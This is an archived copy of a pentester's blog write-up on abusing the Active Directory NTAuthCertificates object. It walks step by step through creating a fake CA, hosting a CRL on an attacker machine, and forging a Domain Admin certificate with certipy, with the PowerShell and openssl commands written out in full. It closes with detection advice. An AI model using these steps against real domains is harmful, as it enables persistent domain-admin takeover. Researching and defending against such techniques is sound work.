---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-05_from-ntauthcertificates-to-silver-certificate.md
original_filename: 2023-09-05_from-ntauthcertificates-to-silver-certificate.md
title: From NTAuthCertificates to “Silver” Certificate
category: documents
detected_topics:
- access-control
- xss
- command-injection
- mobile-security
tags:
- imported
- documents
- access-control
- xss
- command-injection
- mobile-security
language: en
raw_sha256: 188e271c9b99ab988c0c7e64542c1b43e1902e03111c694d12213cec0dd16809
text_sha256: 43d23581876b9e4c9feb38ccf480fae21516d374542036937717804bad8d9aeb
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# From NTAuthCertificates to “Silver” Certificate

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-05_from-ntauthcertificates-to-silver-certificate.md
- Source Type: markdown
- Detected Topics: access-control, xss, command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `188e271c9b99ab988c0c7e64542c1b43e1902e03111c694d12213cec0dd16809`
- Text SHA256: `43d23581876b9e4c9feb38ccf480fae21516d374542036937717804bad8d9aeb`


## Content

---
title: "From NTAuthCertificates to “Silver” Certificate"
page_title: "From NTAuthCertificates to “Silver” Certificate – Decoder's Blog"
url: "https://decoder.cloud/2023/09/05/from-ntauthcertificates-to-silver-certificate/"
final_url: "https://decoder.cloud/2023/09/05/from-ntauthcertificates-to-silver-certificate/"
authors: ["ap (@decoder_it)"]
bugs: ["ADCS", "Active Directory", "Persistence", "Internal pentest"]
publication_date: "2023-09-05"
added_date: "2023-09-13"
source: "pentester.land/writeups.json"
original_index: 808
---

In a recent assessment, I found that a user without special privileges had the ability to make changes to the **NTAuthCertificates** object. This misconfiguration piqued my curiosity, as I wanted to understand how this could potentially be exploited or misused.

Having write access to the **NTAuthCertificates** object in Windows Active Directory, which is located in the Configuration Partition, could potentially have significant consequences, as it involves the management of digital certificates used for authentication and security purposes.

The idea behind a possible abuse is to create a deceptive self-signed Certification Authority (CA) certificate and include it in the**NTAuthCertificates** object. As a result, any fraudulent certificates signed by this deceptive certificate will be considered legitimate. This technique, along with the Golden Certificate, which requires the knowledge of the Active Directory Certification Server (ADCS) private key, has been mentioned in the well-known research [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) published a couple of years ago.

In this blog post, I will document the necessary steps and prerequisites needed for forging and abusing authentication certificates on behalf of any user obtained from a fake CA.

So this is the scenario, reproduced in my lab with the _adsiedit.exe_ tool

![](https://decoder.cloud/wp-content/uploads/2023/09/image.png?w=1024)

If you prefer to do it with the command line, in this case, Powershell, with the ActiveDirectory module installed:
  
  
  $user = Get-ADuser user11
  $dn="AD:CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mylab,DC=local"
  $acl = Get-Acl $dn
  $sid = $user.SID
  $acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,"GenericAll","ALLOW",([GUID]("00000000-0000-0000-0000-000000000000")).guid,"All",([GUID]("00000000-0000-0000-0000-000000000000")).guid))
  Set-Acl $dn $acl
  (get-acl -path $dn).access
  

![](https://decoder.cloud/wp-content/uploads/2023/09/image-1.png?w=805)

Now that we are aware that our user (_user11_ in this case), has control over this object, we first need to create a fake self-signed Certification Authority. This can be easily done with _openssl_ tools.
  
  
  #generate a private key for signing certificates:
  openssl genrsa -out myfakeca.key 2048
  #create and self sign the root certificate:
  openssl req -x509 -new -nodes -key myfakeca.key -sha256 -days 1024 -out myfakeca.crt

When self signing the root certificate you can leave empty all information you will be asked for, except the common name which should reflect your fake CA name as shown in the figure below:

![](https://decoder.cloud/wp-content/uploads/2023/09/image-2.png?w=829)

We need to add the public key of our fake CA (_myfakeca.crt_) in the **cACertificate** attribute stored in **NTAuthCertificates** object, which defines one or more CA that can be used during authentication. This can be done easily with the default _certutil_ tool:

![](https://decoder.cloud/wp-content/uploads/2023/09/image-3.png?w=1024)

Let’s check if it worked:

![](https://decoder.cloud/wp-content/uploads/2023/09/image-4.png?w=729)

Yes, it worked. We have now 2 entries! Now that we have added our fake CA cert, we also need to create the corresponding pfx file which will be used later in the exploitation tools.
  
  
  cat myfakeca.key > myfakeca.pem
  cat myfakeca.crt >> myfakeca.pem
  openssl pkcs12 -in myfakeca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out myfakeca.pfx

Everything is set up, so we could try to forge a certificate for authenticating the Domain Admin. In this example, we will use the [_certipy_](https://github.com/ly4k/Certipy)tool, but you could also use the _[ForgeCert](https://github.com/GhostPack/ForgeCert)_ tool on Windows machines
  
  
  certipy forge -ca-pfx myfakeca.pfx -upn administrator@mylab.local -subject 'CN=Administrator,OU=Accounts,OU=T0,OU=Admin,DC=mylab,DC=local'
  Certipy v4.4.0 - by Oliver Lyak (ly4k)
  [*] Saved forged certificate and private key to 'administrator_forged.pfx'

Once we get the forged cert let’s try to authenticate:
  
  
  certipy auth -pfx administrator_forged.pfx -dc-ip 192.168.212.21
  Certipy v4.4.0 - by Oliver Lyak (ly4k)
  [] Using principal: administrator@mylab.local [] Trying to get TGT…
  [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)

Hmmm, this was somehow expected. The certificate is not trusted, probably we need to add our fake CA to the trusted certification authorities in the DC. But wait, this means that you need high privileges in order to do this, so we have to abandon the idea of kind of privilege escalation and think about this technique as a possible persistence mechanism. Let’s add it to the DC:

![](https://decoder.cloud/wp-content/uploads/2023/09/image-5.png?w=1024)

Bad news,wehen we try to authenticate again, we still get the error message **KDC_ERROR_CLIENT_NOT_TRUSTED**

What’s happening? Well, maybe the change in**NTAuthCertificates** has not been reflected on the DC’s local cache (we updated it as a standard user on a domain-joined PC) which is located under the registry key:
  
  
  HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\NTAuth\Certificates

![](https://decoder.cloud/wp-content/uploads/2023/09/image-6.png?w=1024)

On the DC, we have only one entry that corresponds to the legitimate CA. Normally this entry is aligned with the group policy update, so we could force the update without waiting for the next run (had some issues as it did not always work, needs more investigation) or run _certutil_ to populate the cache:

![](https://decoder.cloud/wp-content/uploads/2023/09/image-7.png?w=1024)

Looks good, so now it should work. But guess what, bad news again! **KDC_ERROR_CLIENT_NOT_TRUSTED**

What’s still wrong? After some research, I figured out that maybe I have a problem with the Certification Revocation List (CRL) which is checked on a regular basis, at least the first time we use a certificate produced by the new CA. So we have to configure a CRL distribution point for my fake CA, which luckily can be done using again _openssl_ ;). 

First of all, we need to create a _ca.conf_ file. I did this on my Linux box.
  
  
  [ca]  
  default_ca = MYFAKECA  
  [crl_ext]  
  authorityKeyIdentifier=keyid:always  
  [MYFAKECA]  
  unique_subject = no  
  certificate = ./myfakeca.crt  
  database = ./certindex  
  private_key = ./myfakeca.key  
  serial = ./certserial  
  default_days = 729  
  default_md = sha1  
  policy = myca_policy  
  x509_extensions = myca_extensions  
  crlnumber = ./crlnumber  
  default_crl_days = 729  
  [myca_policy]  
  commonName = supplied  
  stateOrProvinceName = supplied  
  countryName = optional  
  emailAddress = optional  
  organizationName = supplied  
  organizationalUnitName = optional  
  [myca_extensions]  
  basicConstraints = CA:false  
  subjectKeyIdentifier = hash  
  authorityKeyIdentifier = keyid:always  
  keyUsage = digitalSignature,keyEncipherment  
  extendedKeyUsage = serverAuth  
  crlDistributionPoints = URI:http://192.168.1.88/root.crl

We need to run some _openssl_ commands to produce the necessary files:
  
  
  openssl genrsa -out cert.key 2048
  #ensure that common name is different from your fake CA
  openssl req -new -key cert.key -out cert.csr
  touch certindex
  echo 01 > certserial
  echo 01 > crlnumber
  openssl ca -batch -config ca.conf -notext -in cert.csr -out cert.crt
  openssl pkcs12 -export -out cert.p12 -inkey cert.key -in cert.crt -chain -CAfile myfakeca.crt
  openssl ca -config ca.conf -gencrl -keyfile myfakeca.key -cert myfakeca.crt -out rt.crl.pem
  openssl crl -inform PEM -in rt.crl.pem -outform DER -out root.crl

Finally have our _root.crl_ file, all we need is to setup a minimalistic HTTP server:
  
  
  python3 -m http.server 80

In _certipy_ we need to specify our CRL distribution point:
  
  
  certipy forge -ca-pfx myfakeca.pfx -upn administrator@mylab.local -subject 'CN=Administrator,OU=Accounts,OU=T0,OU=Admin,DC=mylab,DC=local' -crl 'http://192.168.1.88/root.crl'
  Certipy v4.4.0 - by Oliver Lyak (ly4k)
  [*] Saved forged certificate and private key to 'administrator_forged.pfx'
  certipy auth -pfx administrator_forged.pfx  -dc-ip 192.168.212.21
  

![](https://decoder.cloud/wp-content/uploads/2023/09/image-8.png?w=1024)

Bingo! It works, the DC is contacting our CRL distribution point and we are able to authenticate via PKINIT as a domain admin and get his NT hash…. Let’s do it with _[rubeus](https://github.com/GhostPack/Rubeus)_

![](https://decoder.cloud/wp-content/uploads/2023/09/image-10.png?w=932)

It worked again! Let’s check if we can access the C$ share on the DC now:

![](https://decoder.cloud/wp-content/uploads/2023/09/image-11.png?w=651)

At the conclusion of our experiment, we can draw the following conclusions

  * Having only write access to **NTAuthCertificates** is obviously not sufficient to perform a privilege escalation by using forged certificates issued by a fake CA for authentication. You might end up creating client authentication issues by removing the legitimate CA certificate from **NTAuthCertificates**
  * You need to add the fake CA to the trusted Certification Authorities and ensure that the local cache is populated on target Domain Controller
  * On a machine under your control, you need to set a CRL distribution point (not sure if this can be skipped)
  * As I mentioned, this is a persistence technique that is not very stealthy, you can for example monitor events logs 4768 and verify the Certificate Issuer Name, monitor **NTAuthCertificates** object changes, etc…

And this is why, just for fun, I called this the “Silver” certificate 😉

### Share this:

  * [ Share on X (Opens in new window) X ](https://decoder.cloud/2023/09/05/from-ntauthcertificates-to-silver-certificate/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://decoder.cloud/2023/09/05/from-ntauthcertificates-to-silver-certificate/?share=facebook)
  * 

Like Loading...
